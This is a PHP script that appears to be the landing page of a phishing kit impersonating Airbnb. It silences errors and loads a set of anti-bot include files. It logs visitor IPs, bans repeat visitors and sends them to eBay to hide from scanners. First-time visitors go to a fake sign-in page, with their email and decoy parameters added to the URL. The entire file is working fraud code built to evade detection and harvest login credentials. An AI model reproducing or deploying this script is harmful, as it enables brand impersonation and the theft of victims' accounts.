<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include './prevents/anti1.php';
include './prevents/anti2.php';
include './prevents/anti3.php';
include './prevents/anti4.php';
include './prevents/anti5.php';
include './prevents/anti6.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/9atila.php';


error_reporting(0);




session_start(); // Start the php session



$ipad = $_SERVER['REMOTE_ADDR'];



$ban = "Deny from $ipad\n";



$file = "ip.txt";



$max_visits_allow = 1;



$search_max_file = "max_allow_file.log";



$check_max = true;



$search_max = file_get_contents($search_max_file);		



if (substr_count( $search_max , $ipad."\n")<=$max_visits_allow){



	$check_max = false;



	$open = @fopen($search_max_file, "a");		



	@fwrite($open, $ipad."\n");



	@fclose($open);







}else{







	$search = file_get_contents($file);	



	$check = strpos($search, $ipad);







}











if (!$check_max){







}



else{



	if ($check === FALSE) {







		$open = @fopen($file, "a");	



		$write = @fputs($open, $ban);



		@fclose($open);			



			}



	



	header("Location: http://my.ebay.co.uk/");



	



	



	exit;



	



	



} 


$email = '';

if(isset($_GET['email'])){
$email=urlencode($_GET['email']);
}


header("location:newSignIn.php?email=".$email."&md5=".md5('Airbnb.co.uk.europe')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");;










?>



